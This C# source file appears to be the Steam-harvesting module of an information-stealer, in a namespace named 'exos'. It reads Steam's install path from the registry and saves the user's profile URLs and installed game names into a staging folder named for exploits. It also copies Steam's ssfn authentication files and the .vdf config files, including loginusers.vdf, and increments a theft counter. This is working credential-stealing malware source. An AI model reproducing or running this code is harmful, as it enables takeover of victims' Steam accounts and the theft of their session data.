using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using Microsoft.Win32;

namespace exos;

internal class Steam
{
	private static readonly string SteamPath_x64 = "SOFTWARE\\Wow6432Node\\Valve\\Steam";

	public static readonly string SteamPath_x32 = "Software\\Valve\\Steam";

	private static readonly bool True = true;

	private static readonly bool False = false;

	private static readonly string LoginFile = Path.Combine(GetLocationSteam(), "config\\loginusers.vdf");

	public static void SteamGet()
	{
		try
		{
			string text = Helper.ExploitDir + "\\Steam";
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(SteamPath_x32);
			string text2 = registryKey.GetValue("SteamPath").ToString();
			if (!Directory.Exists(text2) || GetLocationSteam() == null || GetAllProfiles() == null)
			{
				return;
			}
			Directory.CreateDirectory(text);
			foreach (string allProfile in GetAllProfiles())
			{
				File.AppendAllText(text + "\\AccountsList.txt", allProfile);
			}
			string[] subKeyNames = registryKey.OpenSubKey("Apps").GetSubKeyNames();
			foreach (string text3 in subKeyNames)
			{
				using RegistryKey registryKey2 = registryKey.OpenSubKey("Apps\\" + text3);
				string text4 = (string)registryKey2.GetValue("Name");
				text4 = (string.IsNullOrEmpty(text4) ? "Unknown" : text4);
				File.AppendAllText(text + "\\Games.txt", text4 + "\n");
			}
			if (Directory.Exists(text2))
			{
				Directory.CreateDirectory(text + "\\ssnf");
				subKeyNames = Directory.GetFiles(text2);
				foreach (string text5 in subKeyNames)
				{
					if (text5.Contains("ssfn"))
					{
						File.Copy(text5, text + "\\ssnf\\" + Path.GetFileName(text5));
					}
				}
			}
			string path = Path.Combine(text2, "config");
			if (Directory.Exists(path))
			{
				Directory.CreateDirectory(text + "\\configs");
				subKeyNames = Directory.GetFiles(path);
				foreach (string text6 in subKeyNames)
				{
					if (text6.EndsWith("vdf"))
					{
						File.Copy(text6, text + "\\configs\\" + Path.GetFileName(text6));
					}
				}
			}
			Counting.Steam++;
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
	}

	public static string GetLocationSteam(string Inst = "InstallPath", string Source = "SourceModInstallPath")
	{
		try
		{
			using RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32);
			using RegistryKey registryKey2 = registryKey.OpenSubKey(SteamPath_x64, Environment.Is64BitOperatingSystem ? True : False);
			using RegistryKey registryKey3 = registryKey.OpenSubKey(SteamPath_x32, Environment.Is64BitOperatingSystem ? True : False);
			return registryKey2?.GetValue(Inst)?.ToString() ?? registryKey3?.GetValue(Source)?.ToString();
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
			return null;
		}
	}

	public static List<string> GetAllProfiles()
	{
		try
		{
			if (!File.Exists(LoginFile))
			{
				return null;
			}
			List<string> list = (from Match x in Regex.Matches(File.ReadAllText(LoginFile), "\\\"76(.*?)\\\"")
				select "76" + x.Groups[1].Value).ToList();
			List<string> list2 = new List<string>();
			for (int i = 0; i < list.Count(); i++)
			{
				list2.Add("https://steamcommunity.com/profiles/" + list[i] + "\n");
			}
			return list2;
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
			return null;
		}
	}
}
